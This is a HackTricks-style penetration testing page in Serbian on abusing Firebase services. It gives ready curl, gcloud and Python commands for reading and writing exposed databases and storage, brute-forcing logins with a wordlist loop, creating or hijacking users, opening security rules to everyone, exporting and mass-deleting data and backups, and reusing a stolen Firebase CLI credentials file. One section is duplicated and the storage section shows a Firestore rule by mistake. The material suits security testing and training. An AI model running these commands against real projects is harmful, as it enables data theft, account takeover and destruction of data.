# GCP - Firebase Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Firebase

### Neautentifikovan pristup Firebase Realtime Database
Napadaču nisu potrebna posebna Firebase dopuštenja da bi izveo ovaj napad. Potrebno je samo da postoji ranjiva konfiguracija u sigurnosnim pravilima Firebase Realtime Database, gde su pravila postavljena sa `.read: true` ili `.write: true`, što omogućava javni pristup za čitanje ili pisanje.

Napadač mora da identifikuje URL baze podataka, koji obično ima format: `https://<project-id>.firebaseio.com/`.

Ovaj URL se može pronaći kroz mobile application reverse engineering (decompiling Android APKs or analyzing iOS apps), analizom konfiguracionih fajlova kao što su google-services.json (Android) ili GoogleService-Info.plist (iOS), pregledom izvornog koda web aplikacija, ili ispitivanjem mrežnog saobraćaja kako bi se identifikovali zahtevi ka `*.firebaseio.com` domenima.

Napadač identifikuje URL baze i proverava da li je javno izložen, zatim pristupa podacima i potencijalno upisuje zlonamerni sadržaj.

Prvo, proveravaju da li baza dozvoljava čitanje dodavanjem .json na URL.
```bash
curl https://<project-id>-default-rtdb.firebaseio.com/.json
```
Ako odgovor sadrži JSON podatke ili null (umesto "Permission Denied"), baza podataka dozvoljava read access. Da bi proverio write access, napadač može pokušati da pošalje test write zahtev koristeći Firebase REST API.
```bash
curl -X PUT https://<project-id>-default-rtdb.firebaseio.com/test.json -d '{"test": "data"}'
```
If the operation succeeds, the database also allows write access.

### Izlaganje podataka u Cloud Firestore
Napadaču nisu potrebna nikakva specifična Firebase permissions da izvede ovaj napad. Potrebno je samo da postoji ranjiva konfiguracija u Cloud Firestore security rules gde pravila dozvoljavaju read or write access bez autentifikacije ili uz nedovoljnu validaciju. Primer neispravno konfigurisanog pravila koje daje full access je:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Ovo pravilo omogućava bilo kome da čita i piše sve dokumente bez ikakvih ograničenja. Firestore pravila su granulirana i primenjuju se po kolekciji i dokumentu, tako da greška u konkretnom pravilu može izložiti samo određene kolekcije.

Napadač mora identifikovati Firebase Project ID, koji se može pronaći kroz mobile app reverse engineering, analizu konfiguracionih fajlova kao što su google-services.json ili GoogleService-Info.plist, inspekcijom izvornog koda web aplikacija, ili analizom mrežnog saobraćaja da bi identifikovao zahteve ka firestore.googleapis.com.

Firestore REST API koristi format:
```bash
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Ako pravila dozvoljavaju unauthenticated read access, attacker može da pročita collections and documents. Prvo pokušava da pristupi određenoj collection:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```
Ako odgovor sadrži JSON dokumente umesto greške vezane za dozvole, kolekcija je izložena. Napadač može izlistati sve dostupne kolekcije pokušavanjem uobičajenih imena ili analizom strukture aplikacije. Da bi pristupio određenom dokumentu:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Ako pravila omogućavaju neautentifikovan pristup za pisanje ili imaju nedovoljnu validaciju, napadač može kreirati nove dokumente:
```bash
curl -X POST https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"name": {"stringValue": "Test"},
"email": {"stringValue": "test@example.com"}
}
}'
```
Za izmenu postojećeg dokumenta treba koristiti PATCH:
```bash
curl -X PATCH https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/users/<user-id> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"role": {"stringValue": "admin"}
}
}'
```
Da obrišete dokument i izazovete denial of service:
```bash
curl -X DELETE https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
### Izloženost fajlova u Firebase Storage
Napadaču nisu potrebna nikakva specifična Firebase ovlašćenja da izvede ovaj napad. Potrebno je samo da postoji ranjiva konfiguracija u Firebase Storage security rules gde pravila dopuštaju pristup za čitanje ili pisanje bez autentifikacije ili sa nedovoljnom validacijom. Storage rules nezavisno kontrolišu dozvole za čitanje i pisanje, pa greška u pravilu može izložiti samo pristup za čitanje, samo pristup za pisanje, ili oba. Primer pogrešno konfigurisanog pravila koje daje potpuni pristup je:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Ovo pravilo dozvoljava čitanje i pisanje svih dokumenata bez ikakvih ograničenja. Firestore pravila su granularna i primenjuju se po kolekciji i po dokumentu, tako da greška u određenom pravilu može izložiti samo neke kolekcije. Napadač mora identifikovati Firebase Project ID, koji se može naći kroz mobile application reverse engineering, analizom konfiguracionih fajlova kao što su google-services.json ili GoogleService-Info.plist, pregledom izvornog koda web aplikacije, ili analizom mrežnog saobraćaja da bi identifikovao zahteve ka firestore.googleapis.com.
Firestore REST API koristi format:`https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>.`

Ako pravila dozvoljavaju neautentifikovano čitanje, napadač može čitati kolekcije i dokumente. Prvo pokušava da pristupi određenoj kolekciji.
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?prefix=<path>"
```
Ako odgovor sadrži listu datoteka umesto greške dozvole, datoteka je izložena. Napadač može pregledati sadržaj datoteka navođenjem njihovog puta:
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<urlencode(path)>"
```
Ako pravila dozvoljavaju neautentifikovan pristup za pisanje ili imaju nedovoljnu validaciju, napadač može otpremiti maliciozne fajlove. Da biste otpremili fajl preko REST API-ja:
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?name=<path>" \
-H "Content-Type: <content-type>" \
--data-binary @<local-file>
```
Napadač može otpremiti code shells, malware payloads ili velike datoteke kako bi izazvao denial of service. Ako aplikacija obrađuje ili izvršava otpremljene datoteke, napadač može postići remote code execution. Da bi obrisao datoteke i izazvao denial of service:
```bash
curl -X DELETE "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<path>"
```
### Pozivanje javnih Firebase Cloud Functions
Napadaču nisu potrebna posebna Firebase dopuštenja da iskoristi ovaj problem; dovoljno je da je Cloud Function javno dostupna preko HTTP-a bez autentifikacije.

Funkcija je ranjiva kada je nesigurno konfigurisana:

- Koristi functions.https.onRequest, koja ne nameće autentifikaciju (za razliku od onCall functions).
- Kod funkcije ne validira korisničku autentifikaciju (npr. nema provera request.auth ili context.auth).
- Funkcija je javno dostupna u IAM, što znači da allUsers ima roles/cloudfunctions.invoker rolu. Ovo je podrazumevano ponašanje za HTTP functions osim ako developer ne ograniči pristup.

Firebase HTTP Cloud Functions izlažu se preko URL-ova kao što su:

- https://<region>-<project-id>.cloudfunctions.net/<function-name>
- https://<project-id>.web.app/<function-name> (when integrated with Firebase Hosting)

Napadač može otkriti ove URL-ove analizom izvornog koda, inspekcijom mrežnog saobraćaja, alatima za enumeraciju ili reverse engineering-om mobilne aplikacije.
Ako je funkcija javno izložena i nema autentifikaciju, napadač je može pozvati direktno bez kredencijala.
```bash
# Invoke public HTTP function with GET
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"
# Invoke public HTTP function with POST and data
curl -X POST "https://<region>-<project-id>.cloudfunctions.net/<function-name>" \
-H "Content-Type: application/json" \
-d '{"param1": "value1", "param2": "value2"}'
```
If the function does not properly validate inputs, the attacker may attempt other attacks such as code injection or command injection.


### Brute-force attack against Firebase Authentication with a weak password policy
Napadaču nisu potrebna nikakva specifična Firebase dozvola da izvede ovaj napad. Potrebno je samo da je Firebase API Key izložen u mobilnim ili web aplikacijama, i da politika lozinki nije podešena sa strožijim zahtevima od podrazumevanih.

Napadač mora identifikovati Firebase API Key, koji se može pronaći kroz reverse engineering mobilne aplikacije, analizu konfiguracionih fajlova kao što su google-services.json ili GoogleService-Info.plist, pregledom izvornog koda web aplikacija (npr. u bootstrap.js), ili analizom mrežnog saobraćaja.

Firebase Authentication’s REST API uses the endpoint:
`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>`
to authenticate with email and password.

Ako je Email Enumeration Protection onemogućena, API odgovori sa greškama mogu otkriti da li email postoji u sistemu (EMAIL_NOT_FOUND vs. INVALID_PASSWORD), što omogućava napadačima da identifikuju korisnike pre nego što pokušaju pogađanje lozinki. Kada je ova zaštita omogućena, API vraća istu poruku o grešci i za nepostojeće emailove i za pogrešne lozinke, što sprečava enumeraciju korisnika.

Važno je napomenuti da Firebase Authentication primenjuje rate limiting, koji može blokirati zahteve ako se previše pokušaja autentifikacije desi u kratkom vremenu. Zbog toga bi napadač morao uvoditi kašnjenja između pokušaja kako bi izbegao rate limiting.

Napadač identifikuje API Key i vrši pokušaje autentifikacije sa više lozinki protiv poznatih naloga. Ako je Email Enumeration Protection onemogućena, napadač može identifikovati postojeće korisnike analizom odgovora sa greškama:
```bash
# Attempt authentication with a known email and an incorrect password
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d '{
"email": "usuario@example.com",
"password": "password",
"returnSecureToken": true
}'
```
Ako odgovor sadrži EMAIL_NOT_FOUND, email ne postoji u sistemu. Ako sadrži INVALID_PASSWORD, email postoji ali je lozinka netačna, što potvrđuje da je korisnik registrovan. Kada je validan korisnik identifikovan, napadač može izvoditi brute-force pokušaje. Važno je uključiti pauze između pokušaja da bi se izbegli Firebase Authentication’s mehanizmi ograničavanja zahteva:
```bash
counter=1
for password in $(cat wordlist.txt); do
echo "Intento $counter: probando contraseña '$password'"
response=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d "{\"email\":\"usuario@example.com\",\"password\":\"$password\",\"returnSecureToken\":true}")

if echo "$response" | grep -q "idToken"; then
echo "Contraseña encontrada: $password (intento $counter)"
break
fi

# Stop for the rate limiting
sleep 1
counter=$((counter + 1))
done
```
Sa podrazumevanom politikom lozinki (minimum 6 karaktera, bez zahteva za složenošću), napadač može pokušati sve moguće kombinacije lozinki od 6 karaktera, što predstavlja relativno mali prostor pretrage u poređenju sa strožijim politikama lozinki.

### Upravljanje korisnicima u Firebase Authentication

Napadaču su potrebna specifična Firebase Authentication dopuštenja da bi izveo ovaj napad. Potrebna dopuštenja su:

- `firebaseauth.users.create` to create users
- `firebaseauth.users.update` to modify existing users
- `firebaseauth.users.delete` to delete users
- `firebaseauth.users.get` to retrieve user information
- `firebaseauth.users.sendEmail` to send emails to users
- `firebaseauth.users.createSession` to create user sessions

Ove dozvole su uključene u ulogu `roles/firebaseauth.admin`, koja daje puni pristup za čitanje i pisanje Firebase Authentication resursima. Takođe su uključene u uloge višeg nivoa kao što su roles/firebase.developAdmin (koja uključuje sva firebaseauth.* permissions) i roles/firebase.admin (puni pristup svim Firebase servisima).

Da bi koristio Firebase Admin SDK, napadaču bi bio potreban pristup service account credentials (JSON file), koji se mogu naći na kompromitovanim sistemima, javno izloženim repozitorijumima koda, kompromitovanim CI/CD sistemima, ili kroz kompromitovanje developerskih naloga koji imaju pristup tim credential-ima.

Prvi korak je konfigurisanje Firebase Admin SDK koristeći service account credentials.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Da bi kreirao zlonamernog korisnika koristeći email žrtve, napadač bi pokušao da koristi Firebase Admin SDK za generisanje novog naloga pod tom email adresom.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Da bi izmenio postojećeg korisnika, napadač bi ažurirao polja kao što su adresa e-pošte, status verifikacije ili da li je nalog onemogućen.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Da bi izbrisao korisnički nalog i prouzrokovao denial of service, napadač bi poslao zahtev za potpuno uklanjanje korisnika.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Napadač takođe može da pribavi informacije o postojećim korisnicima tražeći njihov UID ili adresu e-pošte.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Pored toga, napadač bi mogao da generiše verifikacione linkove ili linkove za resetovanje lozinke kako bi promenio lozinku korisnika i stekao pristup njegovom nalogu.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Upravljanje korisnicima u Firebase Authentication
Napadač treba određene Firebase Authentication dozvole da izvede ovaj napad. Potrebne dozvole su:

- `firebaseauth.users.create` za kreiranje korisnika
- `firebaseauth.users.update` za izmenu postojećih korisnika
- `firebaseauth.users.delete` za brisanje korisnika
- `firebaseauth.users.get` za dobijanje informacija o korisnicima
- `firebaseauth.users.sendEmail` za slanje emailova korisnicima
- `firebaseauth.users.createSession` za kreiranje korisničkih sesija

Ove dozvole su uključene u roli roles/firebaseauth.admin, koja daje pun read/write pristup resursima Firebase Authentication. Takođe su deo višeg nivoa rola kao što su `roles/firebase.developAdmin` (koja uključuje sve firebaseauth.* dozvole) i `roles/firebase.admin` (puni pristup svim Firebase servisima).

Da bi koristio Firebase Admin SDK, napadač bi morao da ima pristup podacima servisnog naloga (JSON fajl), koji se mogu dobiti sa kompromitovanih sistema, javno izloženih repozitorijuma koda, kompromitovanih CI/CD okruženja, ili kompromitovanjem developerskih naloga koji imaju pristup tim podacima.

Prvi korak je konfiguracija Firebase Admin SDK koristeći podatke servisnog naloga.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Da bi kreirao malicioznog korisnika koristeći e-mail žrtve, napadač bi pokušao da kreira novi korisnički nalog sa tim e-mailom, dodeljujući sopstvenu lozinku i podatke profila.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Da bi izmenio postojećeg korisnika, attacker bi promenio polja kao što su email adresa, status verifikacije ili da li je nalog onemogućen.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Da bi obrisao korisnički nalog — efektivno prouzrokovavši denial of service — napadač bi poslao zahtev da trajno ukloni tog korisnika.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Napadač takođe može da dohvati informacije o postojećim korisnicima, kao što su njihov UID ili email, zahtevajući detalje korisnika po UID‑u ili po email adresi.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Pored toga, napadač može da generiše verifikacione linkove ili linkove za resetovanje lozinke, čime bi mogao da promeni lozinku korisnika i preuzme kontrolu nad nalogom.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Izmena bezbednosnih pravila u Firebase servisima
Napadač treba specifična ovlašćenja da izmeni bezbednosna pravila, u zavisnosti od servisa. Za Cloud Firestore i Firebase Cloud Storage, potrebna su ovlašćenja `firebaserules.rulesets.create` za kreiranje ruleset-ova i `firebaserules.releases.create` za objavljivanje releases-a. Ova ovlašćenja su uključena u roli `roles/firebaserules.admin` ili u višim rolama kao što su `roles/firebase.developAdmin` i `roles/firebase.admin`. Za Firebase Realtime Database, potrebno ovlašćenje je `firebasedatabase.instances.update`.

Napadač mora koristiti Firebase REST API da bi izmenio bezbednosna pravila.
Prvo, napadač mora dobiti access token koristeći kredencijale service account-a.
Za dobijanje tokena:
```bash
gcloud auth activate-service-account --key-file=path/to/serviceAccountKey.json
ACCESS_TOKEN=$(gcloud auth print-access-token)
```
Da biste izmenili pravila Firebase Realtime Database:
```bash
curl -X PUT "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?access_token=$ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"rules": {
".read": true,
".write": true
}
}'
```
Da bi izmenio Cloud Firestore rules, napadač mora da kreira skup pravila i potom ga primeni:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "firestore.rules",
"content": "rules_version = '\''2'\'';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Prethodna komanda vraća naziv ruleset u formatu projects/<project-id>/rulesets/<ruleset-id>. Da biste deploy-ovali novu verziju, release mora biti ažuriran pomoću PATCH zahteva:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/cloud.firestore" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/cloud.firestore",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
Da biste izmenili pravila za Firebase Cloud Storage:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "storage.rules",
"content": "service firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Prethodna komanda vraća ime ruleset-a u formatu projects/<project-id>/rulesets/<ruleset-id>. Da bi se objavila nova verzija, release mora biti ažuriran korišćenjem PATCH request-a:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/firebase.storage/<bucket-id>" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/firebase.storage/<bucket-id>",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
### Eksfiltracija i manipulacija podacima u Cloud Firestore
Cloud Firestore koristi istu infrastrukturu i sistem dozvola kao Cloud Datastore, pa Datastore IAM dozvole važe direktno za Firestore. Za manipulaciju TTL politika je potrebna dozvola `datastore.indexes.update`. Za eksport podataka je potrebna dozvola `datastore.databases.export`. Za import podataka je potrebna dozvola `datastore.databases.import`. Za izvođenje masovnog brisanja podataka je potrebna dozvola `datastore.databases.bulkDelete`.

Za operacije bekapa i restore-a potrebne su sledeće specifične dozvole:

- `datastore.backups.get` i `datastore.backups.list` za listanje i dobijanje detalja o dostupnim bekapima
- `datastore.backups.delete` za brisanje bekapa
- `datastore.backups.restoreDatabase` za vraćanje baze iz bekapa
- `datastore.backupSchedules.create` i `datastore.backupSchedules.delete` za upravljanje rasporedima bekapa

Kada se kreira TTL politika, bira se određeno svojstvo koje identifikuje entitete koji ispunjavaju uslove za brisanje. Ovo TTL svojstvo mora biti Date and time type. Napadač može izabrati svojstvo koje već postoji ili odrediti svojstvo koje planira naknadno dodati. Ako je vrednost polja datum iz prošlosti, dokument postaje podoban za trenutno brisanje. Napadač može koristiti gcloud CLI za manipulaciju TTL politikama.
```bash
# Enable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--enable-ttl
# Disable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--disable-ttl
```
Da bi izvezao podatke i izvršio exfiltration, napadač bi mogao koristiti gcloud CLI.
```bash
gcloud firestore export gs://<bucket-name> --project=<project-id> --async --database='(default)'
```
Za uvoz zlonamernih podataka:
```bash
gcloud firestore import gs://<bucket-name>/<path> --project=<project-id> --async --database='(default)'
```
Da bi izvršio masovno brisanje podataka i izazvao denial of service, napadač bi mogao koristiti gcloud Firestore bulk-delete tool da ukloni čitave kolekcije.
```bash
gcloud firestore bulk-delete \
--collection-ids=users,posts,messages \
--database='(default)' \
--project=<project-id>
```
Za backup i restore operacije, napadač može kreirati zakazane backup-e da bi zabeležio trenutno stanje baze podataka, navesti postojeće backup-e, restore-ovati iz backup-a da prepiše nedavne izmene, obrisati backup-e kako bi izazvao trajni gubitak podataka i ukloniti zakazane backup-e.
Da biste napravili dnevni backup schedule koji odmah generiše backup:
```bash
gcloud firestore backups schedules create \
--database='(default)' \
--recurrence=daily \
--retention=14w \
--project=<project-id>
```
Da bi obnovio podatke iz određene rezervne kopije, napadač može kreirati novu bazu podataka koristeći podatke sadržane u toj rezervnoj kopiji. Operacija obnove upisuje podatke rezervne kopije u novu bazu podataka, što znači da se postojeći DATABASE_ID ne može koristiti.
```bash
gcloud firestore databases restore \
--source-backup=projects/<project-id>/locations/<location>/backups/<backup-id> \
--destination-database='<new-database-id>' \
--project=<project-id>
```
Da obrišete backup i prouzrokujete trajni gubitak podataka:
```bash
gcloud firestore backups delete \
--backup=<backup-id> \
--project=<project-id>
```
### Krađa i zloupotreba Firebase CLI akreditiva
Napadaču nisu potrebna specifična Firebase dopuštenja da izvede ovaj napad, ali mu je potreban pristup lokalnom sistemu developera ili do fajla sa Firebase CLI akreditivima. Ovi akreditivi su sačuvani u JSON fajlu koji se nalazi na:

- Linux/macOS: ~/.config/configstore/firebase-tools.json

- Windows: C:\Users\[User]\.config\configstore\firebase-tools.json

Ovaj fajl sadrži autentifikacione tokene, uključujući refresh_token i access_token, koji omogućavaju napadaču da se autentifikuje kao korisnik koji je originalno pokrenuo firebase login.

Napadač dobije pristup fajlu sa Firebase CLI akreditivima. Zatim može kopirati ceo fajl na svoj sistem, i Firebase CLI će automatski koristiti akreditive sa svoje podrazumevane lokacije. Nakon toga, napadač može videti sve Firebase projekte kojima taj korisnik ima pristup.
```bash
firebase projects:list
```
{{#include ../../../banners/hacktricks-training.md}}
